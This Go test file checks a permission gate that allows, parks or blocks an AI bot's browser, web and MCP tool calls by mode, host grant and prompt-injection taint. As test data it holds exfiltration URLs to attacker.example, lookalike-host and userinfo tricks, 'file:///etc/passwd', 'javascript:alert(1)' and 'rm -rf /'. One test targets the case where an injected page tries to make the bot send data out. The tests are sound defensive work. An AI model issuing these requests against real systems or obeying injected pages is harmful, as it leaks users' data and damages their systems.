package chat

import (
	"context"
	"strings"
	"testing"

	"timely-api/internal/features/agent"
)

func botCtx(mode string) BotRunCtx {
	return BotRunCtx{
		BotID:        "bot_1",
		Permission:   mode,
		BrowserSites: []string{"https://shop.example.com", "bank.example.org"},
		Egress:       []string{"api.example.net"},
		ReadHosts:    []string{"https://www.prices.example/item/1"},
	}
}

var botModes = []string{"supervised", "auto", "full"}

func TestBotHostDecisionTable(t *testing.T) {
	granted := map[string]any{"url": "https://shop.example.com/cart?x=1"}
	other := map[string]any{"url": "https://other.example.com/"}
	tainted := func(b *BotRunCtx) { b.Tainted = true }
	type row struct {
		name string
		tool string
		args map[string]any
		mod  func(*BotRunCtx)
		want string
	}
	rows := []row{
		{name: "browser read of a granted site", tool: "bot_browser_read", args: granted, want: "allow"},
		{name: "browser read, www and case", tool: "bot_browser_read", args: map[string]any{"url": "https://WWW.Shop.Example.com/x"}, want: "allow"},
		{name: "browser read after taint is still a read", tool: "bot_browser_read", args: granted, mod: tainted, want: "allow"},
		{name: "browser read of a site not granted parks", tool: "bot_browser_read", args: other, want: "approve"},
		{name: "browser read of a Reads host is no browser grant", tool: "bot_browser_read", args: map[string]any{"url": "https://prices.example/item/1"}, want: "approve"},
		{name: "browser read with no site parks", tool: "bot_browser_read", args: map[string]any{}, want: "approve"},
		{name: "browser read of a lookalike host parks", tool: "bot_browser_read", args: map[string]any{"url": "https://shop.example.com.evil.test/"}, want: "approve"},
		{name: "browser read with a userinfo trick parks", tool: "bot_browser_read", args: map[string]any{"url": "https://shop.example.com@evil.test/"}, want: "approve"},
		{name: "browser read of a subdomain parks", tool: "bot_browser_read", args: map[string]any{"url": "https://evil.shop.example.com/"}, want: "approve"},
		{name: "browser read of a javascript url parks", tool: "bot_browser_read", args: map[string]any{"url": "javascript:alert(1)"}, want: "approve"},
		{name: "browser read of a file url parks", tool: "bot_browser_read", args: map[string]any{"url": "file:///etc/passwd"}, want: "approve"},
		{name: "browser read that types parks", tool: "bot_browser_read", args: map[string]any{"url": "https://shop.example.com/", "type": "hello"}, want: "approve"},
		{name: "browser read that submits parks", tool: "bot_browser_read", args: map[string]any{"url": "https://shop.example.com/", "submit": true}, want: "approve"},
		{name: "browser_exec parks", tool: "browser_exec", args: map[string]any{"code": "goto('https://shop.example.com/')\nclick('#buy')"}, want: "approve"},
		{name: "browser_cdp parks", tool: "browser_cdp", args: map[string]any{"method": "Page.navigate", "params": map[string]any{"url": "https://shop.example.com/"}}, want: "approve"},
		{name: "browser_dialog parks", tool: "browser_dialog", args: map[string]any{"action": "accept"}, want: "approve"},
		{name: "a typing tool parks", tool: "browser_type", args: map[string]any{"text": "x"}, want: "approve"},
		{name: "browser_vault is never offered", tool: "browser_vault", want: "block"},
		{name: "web_extract of a Reads host", tool: "web_extract", args: map[string]any{"urls": []any{"https://prices.example/item/1"}}, want: "allow"},
		{name: "web_extract of a browser site", tool: "web_extract", args: map[string]any{"url": "https://shop.example.com/a"}, want: "allow"},
		{name: "web_extract of an egress host", tool: "web_extract", args: map[string]any{"url": "https://api.example.net/v1"}, want: "allow"},
		{name: "web_extract of another host is blocked", tool: "web_extract", args: map[string]any{"url": "https://attacker.example/?q=secret"}, want: "block"},
		{name: "web_extract with one bad url in a list is blocked", tool: "web_extract", args: map[string]any{"urls": []any{"https://prices.example/", "https://attacker.example/"}}, want: "block"},
		{name: "web_extract with no address is blocked", tool: "web_extract", args: map[string]any{}, want: "block"},
		{name: "web_search before taint", tool: "web_search", args: map[string]any{"query": "reviews of x"}, want: "allow"},
		{name: "web_search after taint is blocked", tool: "web_search", args: map[string]any{"query": "x"}, mod: tainted, want: "block"},
		{name: "bot_note_set", tool: "bot_note_set", args: map[string]any{"key": "k", "value": "v"}, want: "allow"},
		{name: "bot_report", tool: "bot_report", want: "allow"},
		{name: "skill_view", tool: "skill_view", want: "allow"},
		{name: "terminal is never", tool: "terminal", args: map[string]any{"command": "ls"}, want: "block"},
		{name: "process is never", tool: "process", args: map[string]any{"action": "list"}, want: "block"},
		{name: "execute_code is never", tool: "execute_code", args: map[string]any{"code": "print(1)"}, want: "block"},
		{name: "read_file is never", tool: "read_file", args: map[string]any{"path": "/etc/hosts"}, want: "block"},
		{name: "write_file is never", tool: "write_file", args: map[string]any{"path": "a"}, want: "block"},
		{name: "patch is never", tool: "patch", want: "block"},
		{name: "session_search is never", tool: "session_search", want: "block"},
		{name: "cronjob_manage is never", tool: "cronjob_manage", want: "block"},
		{name: "create_bot is never", tool: "create_bot", want: "block"},
		{name: "clarify is never", tool: "clarify", want: "block"},
		{name: "delegate_task is never", tool: "delegate_task", want: "block"},
		{name: "send_message is never", tool: "send_message", want: "block"},
		{name: "an unknown tool is blocked", tool: "mystery_tool", want: "block"},
	}
	// Supervised, Auto and Full Access without the step-up answer alike: the
	// modes differ only in what Full Access lifts after the step-up.
	for _, r := range rows {
		for _, mode := range botModes {
			t.Run(r.name+"/"+mode, func(t *testing.T) {
				b := botCtx(mode)
				if r.mod != nil {
					r.mod(&b)
				}
				d := botHostDecision(b, r.tool, r.args)
				if d.verdict != r.want {
					t.Fatalf("%s in %s: verdict %q (%s%s), want %q", r.tool, mode, d.verdict, d.reason, d.message, r.want)
				}
				switch r.want {
				case "approve":
					if d.card.Kind != cardBrowser || d.card.Reason == "" || d.card.Title == "" || d.card.Grantable {
						t.Fatalf("card %+v", d.card)
					}
				case "block":
					if d.message == "" {
						t.Fatal("a block has no message")
					}
				case "allow":
					if d.by != "auto" {
						t.Fatalf("by %q", d.by)
					}
				}
			})
		}
	}
}

// Full Access after the step-up lifts egress and parks; never tools stay.
func TestBotFullAccessLifts(t *testing.T) {
	b := botCtx("full")
	b.FullAccessOK = true
	allow := func(tool string, args map[string]any) {
		t.Helper()
		if d := botHostDecision(b, tool, args); d.verdict != "allow" || d.by != "full" {
			t.Fatalf("%s: %+v, want allow by full", tool, d)
		}
	}
	allow("web_extract", map[string]any{"url": "https://anywhere.example/"})
	allow("bot_browser_read", map[string]any{"url": "https://anywhere.example/"})
	allow("bot_browser_read", map[string]any{"url": "https://shop.example.com/", "type": "x"})
	allow("browser_exec", map[string]any{"code": "click('#buy')"})
	allow("browser_cdp", map[string]any{"method": "Page.navigate"})
	allow("browser_dialog", map[string]any{"action": "accept"})
	b.Tainted = true
	allow("web_search", map[string]any{"query": "x"})
	allow("web_extract", map[string]any{"url": "https://anywhere.example/"})
	// What the host list allows by itself is "auto", not "full".
	if d := botHostDecision(b, "web_extract", map[string]any{"url": "https://prices.example/item/1"}); d.verdict != "allow" || d.by != "auto" {
		t.Fatalf("by %q", d.by)
	}
	for _, tool := range []string{"terminal", "execute_code", "read_file", "write_file", "session_search", "browser_vault", "cronjob_manage", "create_bot", "clarify", "delegate_task", "send_message"} {
		if d := botHostDecision(b, tool, map[string]any{"command": "ls"}); d.verdict != "block" {
			t.Fatalf("%s in Full Access: %q, want block", tool, d.verdict)
		}
	}
	// Without the step-up the same bot is held like Auto.
	b.FullAccessOK = false
	if d := botHostDecision(b, "web_search", map[string]any{"query": "x"}); d.verdict != "block" {
		t.Fatalf("no step-up: %q", d.verdict)
	}
	if d := botHostDecision(b, "browser_exec", map[string]any{"code": "x"}); d.verdict != "approve" {
		t.Fatalf("no step-up browser_exec: %q", d.verdict)
	}
}

// Supervised and Auto park with their own words; an unknown mode is Supervised.
func TestBotParkedReasonNamesTheMode(t *testing.T) {
	args := map[string]any{"code": "click('#x')"}
	sup := botHostDecision(botCtx("supervised"), "browser_exec", args)
	auto := botHostDecision(botCtx("auto"), "browser_exec", args)
	unknown := botHostDecision(botCtx("nonsense"), "browser_exec", args)
	if sup.verdict != "approve" || auto.verdict != "approve" || unknown.verdict != "approve" {
		t.Fatal("not parked")
	}
	if sup.reason == auto.reason {
		t.Fatal("reasons do not name the mode")
	}
	if unknown.reason != sup.reason {
		t.Fatal("an unknown mode is not Supervised")
	}
	if auto.card.Command == "" {
		t.Fatal("the card shows no script")
	}
}

// The egress rule: after taint an injected page cannot send data out.
func TestBotInjectedPageCannotExfiltrate(t *testing.T) {
	for _, mode := range botModes {
		b := botCtx(mode)
		b.Tainted = true
		for _, c := range []struct {
			tool string
			args map[string]any
		}{
			{"web_extract", map[string]any{"url": "https://attacker.example/?q=USER.md"}},
			{"web_search", map[string]any{"query": "USER.md contents"}},
		} {
			if d := botHostDecision(b, c.tool, c.args); d.verdict != "block" {
				t.Fatalf("%s in %s: %q", c.tool, mode, d.verdict)
			}
		}
	}
}

// A host this tick's web_search returned counts only before taint, and is
// never a browser grant.
func TestBotSearchHostsOnlyBeforeTaint(t *testing.T) {
	b := botCtx("auto")
	b.SearchHosts = []string{"https://found.example/page"}
	args := map[string]any{"url": "https://found.example/page"}
	if d := botHostDecision(b, "web_extract", args); d.verdict != "allow" {
		t.Fatalf("before taint: %q", d.verdict)
	}
	if d := botHostDecision(b, "bot_browser_read", args); d.verdict != "approve" {
		t.Fatalf("browser: %q", d.verdict)
	}
	b.Tainted = true
	if d := botHostDecision(b, "web_extract", args); d.verdict != "block" {
		t.Fatalf("after taint: %q", d.verdict)
	}
}

// The hardline floor blocks by name in every mode, with the floor's reason.
func TestBotHardlineFloor(t *testing.T) {
	for _, mode := range botModes {
		b := botCtx(mode)
		b.FullAccessOK = true
		d := botHostDecision(b, "terminal", map[string]any{"command": "rm -rf /"})
		if d.verdict != "block" || d.message == "" || d.message == agent.BotNeverMessage("terminal") {
			t.Fatalf("%s: %+v", mode, d)
		}
	}
}

// decideHost sends a bot run with a bot context to the bot gate, and keeps
// the old block for a bot run without one and every chat decision.
func TestDecideHostRoutesBotRuns(t *testing.T) {
	ctx := context.Background()
	bot := botCtx("auto")
	st := baseState(agent.Auto)
	st.bot = &bot
	ask := askOf("bot_browser_read", map[string]any{"url": "https://shop.example.com/"})
	ask.RunKind = "bot"
	if d, ok := decideHost(ctx, ask, st); !ok || d.verdict != "allow" {
		t.Fatalf("granted read: %+v ok=%v", d, ok)
	}
	// A taint the ask reports counts.
	search := askOf("web_search", map[string]any{"query": "x"})
	search.RunKind = "bot"
	if d, ok := decideHost(ctx, search, st); !ok || d.verdict != "allow" {
		t.Fatalf("untainted search: %+v ok=%v", d, ok)
	}
	search.Tainted = []TaintSource{{Kind: "web"}}
	if d, ok := decideHost(ctx, search, st); !ok || d.verdict != "block" {
		t.Fatalf("tainted search: %+v ok=%v", d, ok)
	}
	// The run's own taint counts too.
	st.tainted = true
	search.Tainted = nil
	if d, ok := decideHost(ctx, search, st); !ok || d.verdict != "block" {
		t.Fatalf("run-tainted search: %+v ok=%v", d, ok)
	}
	st.tainted = false
	// No bot context: the old block, and a chat's web_search is untouched.
	st.bot = nil
	term := askOf("terminal", map[string]any{"command": "ls"})
	term.RunKind = "bot"
	if d, ok := decideHost(ctx, term, st); !ok || d.verdict != "block" || d.message != hostBotBlocked {
		t.Fatalf("no bot ctx: %+v ok=%v", d, ok)
	}
	if _, ok := decideHost(ctx, askOf("web_search", nil), baseState(agent.Auto)); ok {
		t.Fatal("a chat's web_search became a host call")
	}
	// A bot's MCP call keeps the old block even with a bot context.
	st.bot = &bot
	mcp := askOf("send", nil)
	mcp.RunKind, mcp.Toolset = "bot", "mcp-mail"
	if d, ok := decideHost(ctx, mcp, st); !ok || d.verdict != "block" || d.message != hostBotBlocked {
		t.Fatalf("bot mcp: %+v ok=%v", d, ok)
	}
}

func botMCPAsk(server, tool string, args map[string]any, ro *bool) gateAsk {
	// Hermes names an MCP tool mcp_<server>_<tool>; the bare name is in mcp.tool.
	a := askOf("mcp_"+server+"_"+tool, args)
	a.RunKind, a.Toolset = "bot", "mcp-"+server
	a.MCP = &struct {
		Server      string         `json:"server"`
		Tool        string         `json:"tool"`
		Annotations MCPAnnotations `json:"annotations"`
	}{Server: server, Tool: tool, Annotations: MCPAnnotations{ReadOnly: ro}}
	return a
}

// A bot's MCP tools follow the Bot's own setting per server: off blocks,
// read-only runs, a write is parked before taint and blocked after it, and
// Full Access runs a write only after its step-up.
func TestBotMCPDecisionTable(t *testing.T) {
	yes := true
	rules := &fakeMCP{modes: map[string]string{"mail": mcpUse, "notes": mcpUse, "old": mcpOff}}
	type row struct {
		name    string
		server  string
		tool    string
		args    map[string]any
		ro      *bool
		mod     func(*BotRunCtx)
		noRules bool
		want    string
	}
	use := map[string]string{"mail": "use", "notes": "ask", "old": "use"}
	tainted := func(b *BotRunCtx) { b.Tainted = true }
	rows := []row{
		{name: "a read runs", server: "mail", tool: "list_messages", want: "allow"},
		{name: "a read by hint runs", server: "mail", tool: "fetch_stuff", ro: &yes, want: "allow"},
		{name: "a read runs after taint", server: "mail", tool: "list_messages", mod: tainted, want: "allow"},
		{name: "a write parks", server: "mail", tool: "update_label", want: "approve"},
		{name: "a send parks", server: "mail", tool: "send_message", want: "approve"},
		{name: "a write is blocked after taint", server: "mail", tool: "update_label", mod: tainted, want: "block"},
		{name: "a send is blocked after taint", server: "mail", tool: "send_message", mod: tainted, want: "block"},
		{name: "ask me first parks a read", server: "notes", tool: "list_notes", want: "approve"},
		{name: "ask me first parks a write", server: "notes", tool: "add_note", want: "approve"},
		{name: "ask me first blocks a write after taint", server: "notes", tool: "add_note", mod: tainted, want: "block"},
		{name: "a server the bot does not list is off", server: "other", tool: "list_things", want: "block"},
		{name: "the account turning a server off stops the bot", server: "old", tool: "list_things", want: "block"},
		{name: "a read naming another host is blocked", server: "mail", tool: "list_messages", args: map[string]any{"url": "https://attacker.example/"}, want: "block"},
		{name: "a read naming a bot host runs", server: "mail", tool: "list_messages", args: map[string]any{"url": "https://api.example.net/x"}, want: "allow"},
		{name: "no rules: a plain tool is a write and parks", server: "mail", tool: "list_messages", noRules: true, want: "approve"},
		{name: "no rules: the read-only hint still runs", server: "mail", tool: "list_messages", ro: &yes, noRules: true, want: "allow"},
	}
	for _, mode := range botModes {
		for _, tc := range rows {
			t.Run(mode+"/"+tc.name, func(t *testing.T) {
				b := botCtx(mode)
				b.MCP = use
				if tc.mod != nil {
					tc.mod(&b)
				}
				var r MCPRules = rules
				if tc.noRules {
					r = nil
				}
				d := botMCPDecision(context.Background(), b, r, "user-a", botMCPAsk(tc.server, tc.tool, tc.args, tc.ro))
				// Full Access without its step-up record acts as Auto
				// (botCtx sets none), so the table holds for every mode.
				if d.verdict != tc.want {
					t.Fatalf("%s: %+v, want %s", mode, d, tc.want)
				}
				if d.verdict == "block" && d.message == "" || d.verdict == "approve" && (d.card.Kind != cardMCP || d.card.Server != tc.server || d.card.Reason == "") {
					t.Fatalf("a block has its message and a card its server and reason: %+v", d)
				}
			})
		}
	}
}

// With the Full Access step-up a write runs under Full (and is not blocked
// after taint); "ask me first" still parks.
func TestBotMCPDecisionFullAccess(t *testing.T) {
	rules := &fakeMCP{modes: map[string]string{"mail": mcpUse, "notes": mcpUse}}
	b := botCtx("full")
	b.MCP = map[string]string{"mail": "use", "notes": "ask"}
	b.FullAccessOK = true
	ctx := context.Background()
	d := botMCPDecision(ctx, b, rules, "user-a", botMCPAsk("mail", "update_label", nil, nil))
	if d.verdict != "allow" || d.by != "full" {
		t.Fatalf("a write under Full Access: %+v", d)
	}
	b.Tainted = true
	if d := botMCPDecision(ctx, b, rules, "user-a", botMCPAsk("mail", "update_label", nil, nil)); d.verdict != "allow" || d.by != "full" {
		t.Fatalf("a write after taint under Full Access: %+v", d)
	}
	if d := botMCPDecision(ctx, b, rules, "user-a", botMCPAsk("notes", "add_note", nil, nil)); d.verdict != "approve" {
		t.Fatalf("ask me first still parks: %+v", d)
	}
	b.FullAccessOK = false
	b.Tainted = false
	if d := botMCPDecision(ctx, b, rules, "user-a", botMCPAsk("mail", "update_label", nil, nil)); d.verdict != "approve" {
		t.Fatalf("Full Access with no step-up parks like Auto: %+v", d)
	}
}

func TestGateBotBrowserUsesTheLease(t *testing.T) {
	l := NewBrowserLease()
	b := botCtx("auto")
	read := botHostDecision(b, "bot_browser_read", map[string]any{"url": "https://shop.example.com/"})
	d := gateBotBrowser(l, "u", "check_1", "bot_browser_read", read)
	if d.verdict != "allow" || !l.Busy("u") {
		t.Fatalf("free browser: %+v", d)
	}
	// A chat takes it mid-tick: the bot's next call is browser busy.
	l.AcquireChat("u", "run_1")
	d = gateBotBrowser(l, "u", "check_1", "bot_browser_read", read)
	if d.verdict != "block" || d.message != hostBrowserBusy || !d.browserBusy {
		t.Fatalf("preempted: %+v", d)
	}
	// Still busy after the chat lets go, until the tick releases.
	l.Release("u", ChatHolder("run_1"))
	if d = gateBotBrowser(l, "u", "check_1", "bot_browser_read", read); !d.browserBusy {
		t.Fatalf("after chat release: %+v", d)
	}
	l.Release("u", BotHolder("check_1"))
	if d = gateBotBrowser(l, "u", "check_2", "bot_browser_read", read); d.verdict != "allow" {
		t.Fatalf("next tick: %+v", d)
	}
	// Non-browser tools and parked calls never touch the lease.
	l2 := NewBrowserLease()
	l2.AcquireChat("u", "run_1")
	ext := botHostDecision(b, "web_extract", map[string]any{"url": "https://prices.example/item/1"})
	if d := gateBotBrowser(l2, "u", "c", "web_extract", ext); d.verdict != "allow" {
		t.Fatalf("web_extract: %+v", d)
	}
	park := botHostDecision(b, "browser_exec", map[string]any{"code": "x"})
	if d := gateBotBrowser(l2, "u", "c", "browser_exec", park); d.verdict != "approve" {
		t.Fatalf("parked: %+v", d)
	}
	if d := gateBotBrowser(nil, "u", "c", "bot_browser_read", read); d.verdict != "allow" {
		t.Fatalf("nil lease: %+v", d)
	}
	// Full Access lets a script run, and it takes the lease too.
	fb := botCtx("full")
	fb.FullAccessOK = true
	script := botHostDecision(fb, "browser_exec", map[string]any{"code": "x"})
	l3 := NewBrowserLease()
	if d := gateBotBrowser(l3, "u", "c", "browser_exec", script); d.verdict != "allow" || !l3.Busy("u") {
		t.Fatalf("full script: %+v", d)
	}
}

// The bot's gate-only script tools (Q-B2) park in every mode, Full Access
// after the step-up and a tainted tick included: Go never allows one, so the
// worker runs it only as a continuation's pre_approved call. The card shows
// the script or the dialog answer, and a parked call never takes the lease.
func TestBotScriptToolsAlwaysPark(t *testing.T) {
	calls := []struct {
		tool, show string
		args       map[string]any
	}{
		{"bot_browser_exec", "click('#buy')", map[string]any{"code": "new_tab('https://shop.example.com/cart')\nclick('#buy')"}},
		{"bot_browser_dialog", "accept", map[string]any{"action": "accept"}},
	}
	for _, mode := range botModes {
		for _, full := range []bool{false, true} {
			for _, tainted := range []bool{false, true} {
				b := botCtx(mode)
				b.FullAccessOK, b.Tainted = full, tainted
				for _, c := range calls {
					d := botHostDecision(b, c.tool, c.args)
					if d.verdict != agent.BotApprove || d.by != "" {
						t.Fatalf("%s mode=%s full=%v tainted=%v: %+v, want approve", c.tool, mode, full, tainted, d)
					}
					if d.card.Kind != cardBrowser || !strings.Contains(d.card.Command, c.show) || d.card.Reason == "" {
						t.Fatalf("%s card %+v", c.tool, d.card)
					}
				}
			}
		}
	}
	exec := botHostDecision(botCtx("auto"), "bot_browser_exec", calls[0].args)
	if exec.card.URL != "https://shop.example.com/cart" {
		t.Fatalf("the card names no site: %+v", exec.card)
	}
	if !browserClass("bot_browser_exec") || !browserClass("bot_browser_dialog") {
		t.Fatal("the script tools are browser tools")
	}
	l := NewBrowserLease()
	if d := gateBotBrowser(l, "u", "c", "bot_browser_exec", exec); d.verdict != agent.BotApprove || l.Busy("u") {
		t.Fatalf("a parked script took the lease: %+v", d)
	}
	// Through decideHost too, as a tick's gate.ask reaches it.
	fb := botCtx("full")
	fb.FullAccessOK = true
	ask := gateAsk{Tool: "bot_browser_exec", RunKind: "bot", Args: []byte(`{"code":"click('#buy')"}`)}
	if d, ok := decideHost(context.Background(), ask, hostState{uid: "u", bot: &fb}); !ok || d.verdict != agent.BotApprove {
		t.Fatalf("decideHost: %+v %v", d, ok)
	}
}
